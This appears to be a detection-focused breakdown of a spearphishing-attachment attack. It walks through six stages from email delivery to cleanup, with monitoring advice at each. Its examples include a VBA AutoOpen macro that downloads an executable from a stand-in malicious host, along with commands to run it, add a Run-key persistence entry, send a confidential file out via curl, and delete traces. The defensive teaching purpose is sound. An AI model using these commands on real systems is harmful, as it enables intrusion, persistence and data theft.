Pattern Name: Spearphishing Attachment

Scenario Overview: This attack scenario illustrates how an attacker uses a spearphishing email with a malicious attachment to gain initial access to a victim's system. The attack progresses through multiple stages, involving email clients, web browsers, and office applications, ultimately leading to the execution of a payload that compromises the system.

Attack Flow Breakdown:

1. **Initial Access via Email**
   - **Application Involved**: Outlook (or any email client)
   - **User Action**: The user receives a spearphishing email containing a malicious attachment (e.g., a Word document).
   - **Key Artifacts**: Email headers, attachment file (e.g., `malicious_document.docx`).
   - **Detection Focus**: Monitor for unusual email patterns, such as emails from unknown senders with attachments that have executable macros.

2. **Opening the Malicious Attachment**
   - **Application Involved**: Microsoft Word
   - **User Action**: The user opens the attachment, triggering a macro that downloads a payload.
   - **Key Artifacts**: Macro execution logs, document properties indicating macro settings.
   - **Detection Focus**: Look for macro execution events in Word, especially those that download files from the internet.

   ```shell
   # Example of a macro that could be embedded in the document
   Sub AutoOpen()
       Dim objHTTP As Object
       Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
       objHTTP.Open "GET", "http://malicious-website.com/payload.exe", False
       objHTTP.Send
       ' Save the payload to a temporary location
       Dim stream As Object
       Set stream = CreateObject("ADODB.Stream")
       stream.Type = 1 ' Binary
       stream.Open
       stream.Write objHTTP.responseBody
       stream.SaveToFile Environ("TEMP") & "\payload.exe", 2 ' Overwrite
       stream.Close
   End Sub
   ```

3. **Execution of the Downloaded Payload**
   - **Application Involved**: Windows Explorer (or cmd.exe)
   - **User Action**: The macro saves the payload to the user's temp directory and executes it.
   - **Key Artifacts**: File creation events for `payload.exe`, process creation events for `cmd.exe` or `explorer.exe`.
   - **Detection Focus**: Monitor for execution of files from the temp directory, especially those that are newly created and have been executed immediately after creation.

   ```shell
   # Command to execute the downloaded payload
   start "" "%TEMP%\payload.exe"
   ```

4. **Establishing Persistence**
   - **Application Involved**: Windows Registry
   - **User Action**: The payload modifies the registry to ensure it runs on startup.
   - **Key Artifacts**: Registry keys under `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
   - **Detection Focus**: Monitor for changes to registry keys that indicate persistence mechanisms.

   ```shell
   # Example command to add a registry entry for persistence
   reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MaliciousPayload" /t REG_SZ /d "%TEMP%\payload.exe" /f
   ```

5. **Data Exfiltration**
   - **Application Involved**: Web Browser (e.g., Chrome)
   - **User Action**: The payload connects to a command and control (C2) server to exfiltrate data.
   - **Key Artifacts**: Network traffic to known malicious IP addresses or domains.
   - **Detection Focus**: Monitor for unusual outbound connections, especially to IPs or domains associated with known threats.

   ```shell
   # Example of a command to exfiltrate data
   curl -X POST -F "data=@C:\Users\Victim\Documents\confidential.txt" http://malicious-website.com/exfiltrate
   ```

6. **Cleanup and Evasion**
   - **Application Involved**: Windows Command Line
   - **User Action**: The payload deletes its traces to avoid detection.
   - **Key Artifacts**: Deletion of temporary files, clearing of logs.
   - **Detection Focus**: Monitor for file deletion commands executed shortly after the payload runs.

   ```shell
   # Command to delete the malicious payload after execution
   del "%TEMP%\payload.exe"
   ```
